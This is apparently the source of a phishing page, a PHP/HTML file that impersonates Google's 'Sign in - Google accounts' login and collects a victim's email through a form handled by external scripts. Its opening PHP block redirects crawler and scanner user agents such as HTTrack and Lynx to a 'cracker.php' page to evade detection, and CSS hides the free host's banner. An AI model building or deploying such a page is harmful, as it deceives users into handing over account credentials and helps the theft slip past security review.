<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: ../cracker.php');
die();
}
?>
<html>
<head>
<style>img[alt*="www.000webhost.com"]{display:none}</style>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Sign in - Google accounts">
<meta name="description" content="Login using your Google accounts to continue.">
<meta property="og:description" content="Login using your Google accounts to continue.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Sign in - Google accounts">
<meta property="og:image" content="img/banner.png">
<meta property="og:type" content="website">
<meta name="copyright"content="Sign in - Google accounts">
<title>Sign in - Google accounts</title>
<link rel="stylesheet" href="css/google.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="shortcut icon" href="https://www.google.com/favicon.ico">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<body>
<div class="navbar">
	<center>
	<img width="100" src="img/google.png">
	</center>
</div>
<div id="indexresult">
	<div id="konten">
		<div class="login-box">
			<h5>Sign in</br>
			<p class="login">with your Google account</p>
			</h5>
			</br>
			</br>
			</br>
			<form id="login-form">
				<div class="form-group">
					<input type="text" name="email" id="email" autocomplete="off" required><label>Email or phone</label>
				</div>
				<button class="btn-create">Forgot email?</button>
				</br>
				</br>
				</br>
				<span class="info">Not your computer? Use Guest mode to sign in privately.</span>
				</br>
				</br>
				</br>
				<button class="btn-create">Create account</button>
				<button type="submit" onclick="kirim()" class="btn-login">Next</button>
			</form>
		</div>
		</div>
	<div id="loadingresult" style="display: none;">
		<div class="progress" style="display: none;">
			<div style="display: none;" class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%"></div>
		</div>
	</div>
</div>
<script src="js/proses.js"></script>
<script src="js/content.js"></script>
<script src="js/counter.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
</body>
</html>